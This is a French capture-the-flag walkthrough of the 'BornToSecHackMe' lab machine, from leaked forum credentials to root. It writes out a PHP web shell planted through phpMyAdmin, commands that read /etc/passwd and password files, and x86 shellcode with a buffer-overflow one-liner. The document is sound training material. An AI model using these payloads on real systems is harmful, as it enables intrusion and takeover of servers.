** I ** SCAN **
Nous allons chercher ip du serveur et le scanner, cf ./scans

** II ** EXPLOITATION **


Apres avoir trouve les urls possible on trouve un forum,
dedant il y a un post de l'utilisateur lmezard qui a un soucis de login
en examinant son post qui contient des logs du serveur, on se rend compte qu'il ne met pas son username dans le bon champs
jusqu'a se tromper et y ecrire son mot de pass: !q\]Ej?*5K5cy*AJ

On peut maintenant se connecter avec son compte

username: lmezard
password: !q\]Ej?*5K5cy*AJ

En se connectant on trouve aussi son email dans l'espace de configuration du compte: laurie@borntosec.net

Celle-ci nous permet de nous connecte sur l'url /webmail avec le meme password
On y trouve 2 mails:

############################################
Subject:   	DB Access
From:   	qudevide@mail.borntosec.net
Date:   	Thu, October 8, 2015 11:25 pm
To:   	laurie@borntosec.net
Priority:   	Normal
Options:   	View Full Header |  View Printable Version  | Download this as a file

On y trouve un mail

Hey Laurie,

You cant connect to the databases now. Use root/Fg-'kKXBj87E:aJ$

Best regards.
############################################

############################################
Subject:   	Very interesting !!!!
From:   	qudevide@mail.borntosec.net
Date:   	Thu, October 8, 2015 11:22 pm
To:   	laurie@borntosec.net
Priority:   	Normal
Options:   	View Full Header |  View Printable Version  | Download this as a file

WinDev est un atelier de génie logiciel (AGL) édité par la société
française PC SOFT et conçu pour développer des applications,
principalement orientées données pour Windows 8, 7, Vista, XP, 2008, 2003,
2000, mais également pour Linux, .Net et Java. Il propose son propre
langage, appelé le WLangage. La première version de l'AGL est sortie en
1993. Apparenté à WebDev et WinDev Mobile.

La communauté autour de WinDev
Tour De France Technique
Chaque année, entre le mois de mars et le mois de mai, PC SOFT organise
dans toute la France ce qu'ils appellent le TDF Tech (Tour De France
Technique). Cet événement d'une demi-journée a pour but d'informer et de
présenter les nouveautés de chaque version. Pendant cette courte
formation, les différents intervenants utilisent un grand nombre
d'applications pré-conçues dans lesquelles ils ont intégré les multiples
nouveautés, tout en exploitant le matériel (serveurs, téléphones) qu'ils
ont apporté. Non seulement, WinDev est largement mis en avant, mais aussi
les autres environnements : WebDev et WinDev Mobile. Le code source des
sujets présentés ainsi qu'un support de cours sont remis à chaque
participant.
############################################

** III ** POSTEXPLOITATION

https://www.hackingarticles.in/shell-uploading-web-server-phpmyadmin/

Maintenant nous allons créer une backdoor dans le serveur à partir de phpmyadmin
Pour cela nous allons créer un database pour y injecter du sql et essayer d'executer des commandes

-> SELECT "<?php system($_GET['cmd']); ?>" into outfile "${path}/backdoor.php"

Les fichiers d'un serveur apache sont stocker dans /var/www/ et dans notre cas il contient forum | webmail | phpmyadmin
Le problème c'est que nous n'avons pas les droits pour y stocker notre fichier backdoor.php qui affichera les résultats de notre injection sql
Nous avons toujour le même message d'erreur de phpmyadmin
#1 - Can't create/write to file '/var/www/forum/backdoor.php' (Errcode: 2)

Après retour en arrière sur les pages dont on a accès comme le forum, on remarque qu'il est créer avec MyLittleForum
En clickant sur le lien en bas de la page 'powered by my little forum', on arrive sur leur page github et nous trouvons quelques choses de très intéressant

https://github.com/ilosuna/mylittleforum

############################################
README.md
my little forum
my little forum is a simple PHP and MySQL based internet forum that displays the messages in classical threaded view (tree structure). It is Open Source licensed under the GNU General Public License. The main claim of this web forum is simplicity. Furthermore it should be easy to install and run on a standard server configuration with PHP and MySQL.

More about my little forum
Demo and project discussion forum
System requirements
Webserver with PHP >= 5.4 and MySQL >= 5.5.3
Installation
Unzip the script package.
Upload the complete folder "forum" to your server.
Depending on your server configuration the write permissions of the subdirectory templates_c (CHMOD 770, 775 or 777) and the file config/db_settings.php (CHMOD 666) might need to be changed in order that they are writable by the script.
Run the installation script by accessing yourdomain.tld/forum/install/ in your web browser and follow the instructions.
############################################

On remarque le dossier templates_c dont les droit doivent être modifier pour le script d'install => 'Depending on your server configuration the write permissions of the subdirectory templates_c (CHMOD 770, 775 or 777)'
Essayons deja l'url de ce dossier https://192.168.1.56/forum/templates_c/
On y trouve plusieur fichier php

Essayons donc d'y stocker notre backdoor.php

-> SELECT "<?php system($_GET['cmd']); ?>" into outfile "/var/www/forum/templates_c/backdoor.php"

BINGO nous avons notre backdoor
Nous pouvons à présent envoyer des cmd dans l'url de cette manière

-> https://192.168.1.56/forum/templates_c/backdoor.php?cmd=pwd

/var/www/forum/templates_c

-> https://192.168.1.56/forum/templates_c/backdoor.php?cmd=whoami

www-data

-> https://192.168.1.56/forum/templates_c/backdoor.php?cmd=cat%20/etc/passwd

root:x:0:0:root:/root:/bin/bash 
daemon:x:1:1:daemon:/usr/sbin:/bin/sh 
bin:x:2:2:bin:/bin:/bin/sh 
sys:x:3:3:sys:/dev:/bin/sh 
sync:x:4:65534:sync:/bin:/bin/sync 
games:x:5:60:games:/usr/games:/bin/sh 
man:x:6:12:man:/var/cache/man:/bin/sh 
lp:x:7:7:lp:/var/spool/lpd:/bin/sh 
mail:x:8:8:mail:/var/mail:/bin/sh 
news:x:9:9:news:/var/spool/news:/bin/sh 
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh 
proxy:x:13:13:proxy:/bin:/bin/sh 
www-data:x:33:33:www-data:/var/www:/bin/sh 
backup:x:34:34:backup:/var/backups:/bin/sh 
list:x:38:38:Mailing List Manager:/var/list:/bin/sh 
irc:x:39:39:ircd:/var/run/ircd:/bin/sh 
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh 
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh 
libuuid:x:100:101::/var/lib/libuuid:/bin/sh 
syslog:x:101:103::/home/syslog:/bin/false 
messagebus:x:102:106::/var/run/dbus:/bin/false 
whoopsie:x:103:107::/nonexistent:/bin/false 
landscape:x:104:110::/var/lib/landscape:/bin/false 
sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin 
ft_root:x:1000:1000:ft_root,,,:/home/ft_root:/bin/bash 
mysql:x:106:115:MySQL Server,,,:/nonexistent:/bin/false 
ftp:x:107:116:ftp daemon,,,:/srv/ftp:/bin/false 
lmezard:x:1001:1001:laurie,,,:/home/lmezard:/bin/bash 
laurie@borntosec.net:x:1002:1002:Laurie,,,:/home/laurie@borntosec.net:/bin/bash 
laurie:x:1003:1003:,,,:/home/laurie:/bin/bash 
thor:x:1004:1004:,,,:/home/thor:/bin/bash 
zaz:x:1005:1005:,,,:/home/zaz:/bin/bash 
dovecot:x:108:117:Dovecot mail server,,,:/usr/lib/dovecot:/bin/false 
dovenull:x:109:65534:Dovecot login user,,,:/nonexistent:/bin/false 
postfix:x:110:118::/var/spool/postfix:/bin/false

-> https://192.168.1.56/forum/templates_c/backdoor.php?cmd=ls%20/home

LOOKATME ft_root laurie laurie@borntosec.net lmezard thor zaz

-> https://192.168.1.56/forum/templates_c/backdoor.php?cmd=ls%20/home/LOOKATME

password

-> https://192.168.1.56/forum/templates_c/backdoor.php?cmd=cat%20/home/LOOKATME/password

lmezard:G!@M6f4Eatau{sF"

Nous trouvons finalement quelques chose... Essayons une connection ssh avec ces infos ! NOP sa ne fonctionne pas.
Mais grace au scans nmap on voit qu'on a aussi le port ftp d'ouvret, testons celui-ci

=> cmd: ftp 192.168.1.56
Connected to 192.168.1.56.
220 Welcome on this server
Name (192.168.1.56:sab): lmezard
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rwxr-x---    1 1001     1001           96 Oct 15  2015 README
-rwxr-x---    1 1001     1001       808960 Oct 08  2015 fun
226 Directory send OK.
ftp> get README
local: README remote: README
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for README (96 bytes).
226 Transfer complete.
96 bytes received in 0.00 secs (347.2222 kB/s)
226 Directory send OK.
ftp> get fun
local: fun remote: fun
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for fun (808960 bytes).
226 Transfer complete.
808960 bytes received in 0.11 secs (6.9712 MB/s)
ftp> quit
221 Goodbye.

On a maintenant les fichier README et fun

$ cat README
Complete this little challenge and use the result as password for user 'laurie' to login in ssh

Pour le fichier fun:
On voit au début un nom dossier ft_fun et une liste de fichier ex: ft_fun/331ZU.pcap
Après l'avoir rendu plus lisible on comprends que les fichiers contiennent des parties de code qui se suivent en allant sur le fichier indiqué la fin
On peut donc reconstruire les fonctions getme manquantes en cherchant chaque nom (getme1) puis sont fichier de suite
cf fun_getme_reconstruction.txt

$ gcc fun_code.c
$ ./a.out       
MY PASSWORD IS: Iheartpwnage
Now SHA-256 it and submit%

HASH => 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
https://www.movable-type.co.uk/scripts/sha256.html

Now we should be able to connect with shh as laurie

$ ssh laurie@192.168.1.56
        ____                _______    _____
       |  _ \              |__   __|  / ____|
       | |_) | ___  _ __ _ __ | | ___| (___   ___  ___
       |  _ < / _ \| '__| '_ \| |/ _ \\___ \ / _ \/ __|
       | |_) | (_) | |  | | | | | (_) |___) |  __/ (__
       |____/ \___/|_|  |_| |_|_|\___/_____/ \___|\___|

                       Good luck & Have fun
laurie@192.168.1.56's password:
laurie@BornToSecHackMe:~$ ls
bomb  README
laurie@BornToSecHackMe:~$ cat README
Diffuse this bomb!
When you have all the password use it as "thor" user with ssh.

HINT:
P
 2
 b

o
4

NO SPACE IN THE PASSWORD (password is case sensitive).

laurie@BornToSecHackMe:~$ ./bomb 
Welcome this is my little bomb !!!! You have 6 stages with
only one life good luck !! Have a nice day!
Public speaking is very easy.
Phase 1 defused. How about the next one?
1 2 6 24 120 720
That's number 2.  Keep going!
1 b 214
Halfway there!
9
So you got that one.  Try this one.
opekma
Good work!  On to the next...
4 2 6 3 1 5
Congratulations! You've defused the bomb!

cf ./users/laurie/bomb_crack for details

Donc le mot de pass de thor donne: Publicspeakingisveryeasy.126241207201b2149opekma426315

laurie@BornToSecHackMe:~$ su thor
Password: 
su: Authentication failure

Fail, mais il y a 2 possibilitées pour la phase 4 
opekma que l'on vient de tester ou opekmq car a et q à travers l'algo phase_5 donne le s de giants
ce qui nous donne le mdp suivant: 

=> Publicspeakingisveryeasy.126241207201b2149opekmq426135

laurie@BornToSecHackMe:~$ su thor
Password: 
thor@BornToSecHackMe:~$ ls
README  turtle

On est maintenant loger en tant que thor et il faut resoudre turtle
Après analyse et recherche on comprends que le fichier contient 
des instructions de dessin que l'on peut exploiter avec turle de python

En interpretant ces instructions grâce au script ./users/thor/turtle_crack.py
On obtient un dessin représetant le mot SLASH
Il faut maintenant le digester en md5 pour obtenir le mdp de zaz
https://www.freeformatter.com/message-digest.html#ad-output

=> 646da671ca01bb5d84dbb5fb2238dc8e

thor@BornToSecHackMe:~$ su zaz
Password:
zaz@BornToSecHackMe:~$ ls -la
total 12
drwxr-x--- 4 zaz      zaz   147 Oct 15  2015 .
drwxrwx--x 1 www-data root  100 Oct 13  2015 ..
-rwxr-x--- 1 zaz      zaz     1 Oct 15  2015 .bash_history
-rwxr-x--- 1 zaz      zaz   220 Oct  8  2015 .bash_logout
-rwxr-x--- 1 zaz      zaz  3489 Oct 13  2015 .bashrc
drwx------ 2 zaz      zaz    43 Oct 14  2015 .cache
-rwsr-s--- 1 root     zaz  4880 Oct  8  2015 exploit_me
drwxr-x--- 3 zaz      zaz   107 Oct  8  2015 mail
-rwxr-x--- 1 zaz      zaz   675 Oct  8  2015 .profile
-rwxr-x--- 1 zaz      zaz  1342 Oct 15  2015 .viminfo
zaz@BornToSecHackMe:~/mail$ ls -la
total 1
drwxr-x--- 3 zaz zaz 107 Oct  8  2015 .
drwxr-x--- 4 zaz zaz 147 Oct 15  2015 ..
drwxr-x--- 5 zaz zaz  99 Oct  8  2015 .imap
-rwxr-x--- 1 zaz zaz   0 Oct  8  2015 INBOX.Drafts
-rwxr-x--- 1 zaz zaz   0 Oct  8  2015 INBOX.Sent
-rwxr-x--- 1 zaz zaz   0 Oct  8  2015 INBOX.Trash
-rwxr-x--- 1 zaz zaz  36 Oct  8  2015 .subscriptions

On arrive enfin à un ficher exploitable qui à les droits root, exploit_me

1. Testons si il segfault

zaz@BornToSecHackMe:~$ ./exploit_me aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Segmentation fault (core dumped)

=> OK, le but maintenant serai donc de lancer un shell à travers un buffer overflow

2. Analyons plus en detail avec gdb et cherchons l'offset de eip grâce à une string spécialisée https://wiremask.eu/tools/buffer-overflow-pattern-generator/?

zaz@BornToSecHackMe:~$ gdb exploit_me
(gdb) set disassembly-f i
(gdb) disas main
Dump of assembler code for function main:
   0x080483f4 <+0>:	push   ebp
   0x080483f5 <+1>:	mov    ebp,esp
   0x080483f7 <+3>:	and    esp,0xfffffff0
   0x080483fa <+6>:	sub    esp,0x90
   0x08048400 <+12>:	cmp    DWORD PTR [ebp+0x8],0x1
   0x08048404 <+16>:	jg     0x804840d <main+25>
   0x08048406 <+18>:	mov    eax,0x1
   0x0804840b <+23>:	jmp    0x8048436 <main+66>
   0x0804840d <+25>:	mov    eax,DWORD PTR [ebp+0xc]
   0x08048410 <+28>:	add    eax,0x4
   0x08048413 <+31>:	mov    eax,DWORD PTR [eax]
   0x08048415 <+33>:	mov    DWORD PTR [esp+0x4],eax
   0x08048419 <+37>:	lea    eax,[esp+0x10]
   0x0804841d <+41>:	mov    DWORD PTR [esp],eax
   0x08048420 <+44>:	call   0x8048300 <strcpy@plt>
   0x08048425 <+49>:	lea    eax,[esp+0x10]
   0x08048429 <+53>:	mov    DWORD PTR [esp],eax
   0x0804842c <+56>:	call   0x8048310 <puts@plt>
   0x08048431 <+61>:	mov    eax,0x0
   0x08048436 <+66>:	leave
   0x08048437 <+67>:	ret
End of assembler dump.
(gdb) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
Starting program: /home/zaz/exploit_me Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

Program received signal SIGSEGV, Segmentation fault.
0x37654136 in ?? ()

=> Offset = 140

3. Plaçons un shellcode (/bin/sh) dans l'env et trouvons sont adresse

zaz@BornToSecHackMe:~$ export SHELLCODE=$(python -c 'print "\x90"*100 +"\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"')

zaz@BornToSecHackMe:~$ gdb -q exploit_me
Reading symbols from /home/zaz/exploit_me...(no debugging symbols found)...done.
(gdb) set disassembly-f i
(gdb) b main
Breakpoint 1 at 0x80483f7
(gdb) r
Starting program: /home/zaz/exploit_me

Breakpoint 1, 0x080483f7 in main ()
(gdb) x/s *environ
0xbffff85a:	 "SHELLCODE=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\061\300\061۰\006̀Sh/ttyh/dev\211\343\061\311f\271\022'\260\005̀1\300Ph//shh/bin\211\343PS\211ᙰ\v̀"
(gdb) x/20i *environ
   0xbffff85a:	push   ebx
   0xbffff85b:	dec    eax
   0xbffff85c:	inc    ebp
   0xbffff85d:	dec    esp
   0xbffff85e:	dec    esp
   0xbffff85f:	inc    ebx
   0xbffff860:	dec    edi
   0xbffff861:	inc    esp
   0xbffff862:	inc    ebp
   0xbffff863:	cmp    eax,0x90909090
   0xbffff868:	nop
   0xbffff869:	nop
   0xbffff86a:	nop
   0xbffff86b:	nop
   0xbffff86c:	nop
   0xbffff86d:	nop
   0xbffff86e:	nop
   0xbffff86f:	nop          <= Nous allons prendre cette adresse du slipe de nop
   0xbffff870:	nop
   0xbffff871:	nop
(gdb) quit
A debugging session is active.

	Inferior 1 [process 7083] will be killed.

Quit anyway? (y or n) y

4. Il ne reste plus qu'à lancer un exploit avec python

zaz@BornToSecHackMe:~$ ./exploit_me $(python -c "print 'A' * 140 + '\x6f\xf8\xff\xbf'")
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAo���
# whoami
root

BINGO ON EST ROOT ! 🥳